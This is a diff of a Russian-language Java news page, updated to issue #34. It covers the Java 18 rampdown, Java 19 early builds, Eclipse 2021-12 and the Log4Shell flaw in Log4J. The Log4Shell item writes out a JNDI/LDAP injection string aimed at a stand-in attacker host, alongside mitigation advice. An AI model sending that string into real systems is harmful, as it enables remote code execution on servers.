@@ -8,7 +8,7 @@
     <meta property="og:title" content="miniJUG">
     <meta property="og:description" content="Новости Java">
     <meta property="og:site_name" content="miniJUG">
-    <meta property="article:published_time" content="2021-12-06">
+    <meta property="article:published_time" content="2021-12-13">
     <meta property="article:author" content="miniJUG">
     <meta property="article:author_url" content="https://twitter.com/mini_JUG">
     <meta name="twitter:card" content="summary_large_image">
@@ -31,42 +31,33 @@
     <div class="container">
       <div class="row">
         <div class="p-lg-4 p-3 bg-white rounded col-lg-8" style="font-size: 1.15rem">
-<h3 id="title">Новости Java #33</h3>
-<p class="text-secondary"><time datetime="2021-12-06">6 декабря, 2021</time></p>
+<h3 id="title">Новости Java #34</h3>
+<p class="text-secondary"><time datetime="2021-12-13">13 декабря, 2021</time></p>
 <article>
-<p>&bull; Ещё один JEP предложен к Java 18: <a href="https://openjdk.java.net/jeps/421">Deprecate Finalization for Removal (JEP 421)</a>.</p>
+<p>&bull; Java 18 перешла в <a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-December/006287.html">первую фазу Rampdown</a>: главный репозиторий JDK был ответвлён в <a href="https://github.com/openjdk/jdk18">стабилизационный репозиторий JDK 18</a>, и новых JEP'ов в этом релизе больше не будет.</p>
+<p>Одновременно с этим началась <a href="https://bugs.openjdk.java.net/browse/JDK-8273146">разработка Java 19</a>. У нового релиза появилась <a href="https://jdk.java.net/19/">своя страница</a>, где уже доступна для скачивания первая ранняя сборка JDK 19-ea+1.</p>
 
-<p class="pt-2">&bull; В проекте Valhalla появился новый черновик JEP: <a href="http://openjdk.java.net/jeps/8277163">Value Objects (Preview)</a>. В нём предлагается ввести новый тип объектов в Java: value-объекты.</p>
-<p>Value-объекты отличаются от классических объектов тем, что не имеют identity. Это позволяет улучшить производительность при использовании таких объектов и уменьшить занимаемое ими место в памяти. Также value-объекты являются полностью иммутабельными, всегда являются <code class="text-nowrap">final</code> и не могут иметь <code class="text-nowrap">synchronized</code>-методов.</p>
-<p>Однако, в отличие от примитивных объектов (<a href="https://openjdk.java.net/jeps/401">JEP 401</a>), которые также имеют все вышеописанные свойства, value-объекты являются ссылочными, поэтому являются nullable.</p>
-<p>Таким образом, если в Valhalla всё будет реализовано согласно такой модели, то в Java будет три типа объектов: identity-объекты, value-объекты и примитивные объекты.</p>
+<p class="pt-2">&bull; В популярной библиотеке логирования Apache Log4J 2.x обнаружили <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">серьёзную уязвимость</a>, позволяющую выполнить на уязвимом сервере произвольный код. Уязвимость может быть эксплуатирована, если Log4J используется для параметризированного логирования непроверенного текста, приходящего от пользователя, например:</p>
+<pre class="border p-lg-2 p-1">log.info(<span style="color: darkred">"Сообщение от пользователя: {}"</span>, userMsg);</pre>
+<p>Злоумышленник может воспользоваться этим и послать строку специального вида (<code class="text-nowrap">${jndi:ldap://attacker.com/a}</code>), которую обработает Log4J и загрузит через JNDI вредоносный класс с LDAP-сервера, контролируемого злоумышленником. Класс будет инъектирован в Java-процесс, что позволит атакующему выполнить произвольный код с правами пользователя, от лица которого запущен процесс.</p>
+<p>Так как Apache Log4J является одной из двух самых популярных библиотек логирования в Java (наряду с Logback), то такая уязвимость поставила под угрозу огромное количество сервисов по всему миру, включая крупнейших.</p>
+<p>Наиболее надёжным способом защиты от Log4Shell (такое народное название дали этой уязвимости) является обновление Log4J до версии <a href="https://search.maven.org/artifact/org.apache.logging.log4j/log4j/2.15.0/pom">2.15.0</a>. Также решением является установка системного свойства <code class="text-nowrap">log4j2.formatMsgNoLookups=true</code>, однако оно работает только для версий Log4J <code class="text-nowrap">2.10.0</code> и выше. Кроме того, можно полностью удалить class-файл <code class="text-nowrap">org/apache/logging/log4j/core/lookup/JndiLookup.class</code> из библиотеки.</p>
+<p>Уязвимости меньше подвержены <a href="https://gist.github.com/shipilev/cfbe09a31ac32f0cc51078db7898c797">новые версии Java</a> (8u191+, 11.0.1+, 13, 15, 17), однако они не защищены от всех возможных векторов атаки, поэтому полагаться на такую защиту крайне нежелательно и настоятельно рекомендуется предпринять один из вышеописанных шагов.</p>
 
-<p class="pt-2">&bull; Вышла <a href="https://blog.jetbrains.com/idea/2021/11/intellij-idea-2021-3/">IntelliJ IDEA 2021.3</a>. Перечислим некоторые заметные изменения и улучшения:</p>
+<p class="pt-2">&bull; Вышел <a href="https://www.youtube.com/watch?v=3W9bvidcO20">Eclipse 2021-12</a> со следующими нововведениями:</p>
 <ul>
-  <li>В Ultimate версии появилась возможность <a href="https://blog.jetbrains.com/blog/2021/11/29/introducing-remote-development-for-jetbrains-ides/">удалённой разработки</a>. Развернув бэкенд IDEA на удалённом сервере, к нему можно подключиться и работать из любой точки мира. Функция пока работает в Beta-режиме.</li>
-  <li>Новая функция <i>Repair IDE</i> позволяет быстро диагностировать и устранять наиболее распространённые неполадки.</li>
-  <li>Возможность изменить шрифт во всех вкладках одновременно с помощью <code class="text-nowrap">Ctrl</code> и колеса мыши.</li>
-  <li>Улучшенный предпросмотр результатов <a href="https://www.jetbrains.com/help/idea/intention-actions.html">intention-действий</a>.</li>
-  <li>Возможность разделения окна <i>Run</i> на несколько вкладок.</li>
-  <li>Поиск действий в <i>Search Everywhere</i> теперь тоже использует машинное обучение (ранее в IDEA 2020.3 машинное обучение было введено для Code Completion).</li>
-  <li>Новые инспекции в Java: отслеживание небезопасных строк (SQL-инъекция, XSS, конфиденциальные данные и т.п.), замена <code class="text-nowrap">collect(toList())</code> на <code class="text-nowrap">toList()</code>.</li>
-  <li>При выполнении рефакторинга <i>Introduct Local Variable</i> теперь не всплывает окно с настройками, а появляется значок шестерёнки. А при выполнении рефакторинга <i>Introduct Parameter</i> среда теперь спрашивает, где нужно заменить вхождения, и тоже показывает значок шестерёнки.</li>
-  <li>В <i>Run/Debug Configurations</i> теперь можно настраивать classpath, вручную добавляя туда отдельные записи или исключая ненужные.</li>
-  <li>Множество новых улучшений в Kotlin: действие <i>Smart Step Into</i> в отладчике, <code class="text-nowrap">inline</code>-функции в стек-трейсе, рефакторинг <i>Extract Constant</i>, улучшенная инспекция <i>Possibly blocking call in non-blocking context</i>, подсказки для диапазонов, улучшенный мастер создания проектов.</li>
-  <li>Async Profiler 2.0 теперь доступен в Windows-версии IntelliJ IDEA Ultimate из коробки.</li>
+  <li>Поддержка разработки на Java 17</li>
+  <li>Новое действие "Convert String concatenation to Text Block"</li>
+  <li>Возможность помечать объекты меткой в режиме отладки</li>
+  <li>Умная вставка текста в поле диалога Open Type (обрезание лишнего)</li>
+  <li>Новый редактор POM с возможностью автодополнения по имени артефакта/плагина и выбором из выпадающего списка версий</li>
+  <li>Новое view "Launch Configurations"</li>
+  <li>Мультикурсоры (одновременное редактирование в нескольких частях файла)</li>
+  <li>Открывание ссылок во внешнем браузере вместо внутреннего</li>
+  <li>Улучшения в тёмной теме</li>
+  <li>Улучшение времени старта IDE</li>
+  <li>Улучшения в EGit и JS-редакторе</li>
 </ul>
-
-<p class="pt-2">&bull; Компания JetBrains анонсировала свою новую среду разработки <a href="https://blog.jetbrains.com/ru/blog/2021/11/29/welcome-to-fleet/">Fleet</a>.</p>
-<p>Fleet &ndash; это созданная с нуля среда разработки, которая представляет собой легковесный редактор с базовыми возможностями, но с возможностью включения smart-режима, при котором она превращается в полнофункциональную IDE. В отличие от классических IDE JetBrains, каждая из которых создана для одной конкретной технологии, Fleet поддерживает разные технологии в рамках одного приложения (на текущий момент есть поддержка Java, Kotlin, Python, Go, JavaScript, Rust, TypeScript, JSON). Fleet имеет <a href="https://www.jetbrains.com/help/fleet/1.0/architecture-overview.html">распределённую архитектуру</a>, в которой фронтенд отделён от бэкенда, что позволяет использовать среду не только локально, но и в распределённых сценариях: удалённая, облачная, совместая разработка и т.д.</p>
-<p>В данный момент Fleet недоступен широкому кругу пользователей, и работает программа Fleet Preview, в которой, однако, <a href="https://twitter.com/JetBrains_Fleet/status/1466705214761840643">закончился приём заявок </a> из-за большого наплыва желающих протестировать новую IDE.</p>
-
-<p class="pt-2">&bull; Вышел выпуск <a href="https://blog.jetbrains.com/idea/2021/12/java-annotated-monthly-december-2021/">Java Annotated Monthly</a> от JetBrains за декабрь 2021.</p>
-
-<p class="pt-2">&bull; Вышел <a href="https://maven.apache.org/docs/3.8.4/release-notes.html">Apache Maven 3.8.4</a>.</p>
-
-<p class="pt-2">&bull; Вышла <a href="http://www.h2database.com/html/changelog.html">вторая версия</a> H2, популярной SQL СУБД, написанной полностью на Java. Это произошло спустя 16 лет после выхода первой версии.</p>
-
-<p class="pt-2">&bull; Вышел <a href="https://mail.openjdk.java.net/pipermail/jcstress-dev/2021-December/000965.html">JCStress 0.15</a>.</p>
 </article>
   <p class="pt-4 font-italic">Подписывайтесь на <a href="https://t.me/miniJUG">канал в Telegram</a>, чтобы не пропускать новости.</p>
 </div>
@@ -74,6 +65,7 @@
 <div class="mt-3">
   <a class="dropdown-toggle text-body" data-toggle="collapse" href="#year2021" role="button" aria-expanded="true" aria-controls="year2021">2021</a>
   <ul class="collapse show" id="year2021">
+<li class="text-secondary"><a href="java_news_34.html" class="text-secondary">Новости Java #34</a></li>
 <li class="text-secondary"><a href="java_news_33.html" class="text-secondary">Новости Java #33</a></li>
 <li class="text-secondary"><a href="java_news_32.html" class="text-secondary">Новости Java #32</a></li>
 <li class="text-secondary"><a href="java_news_31.html" class="text-secondary">Новости Java #31</a></li>
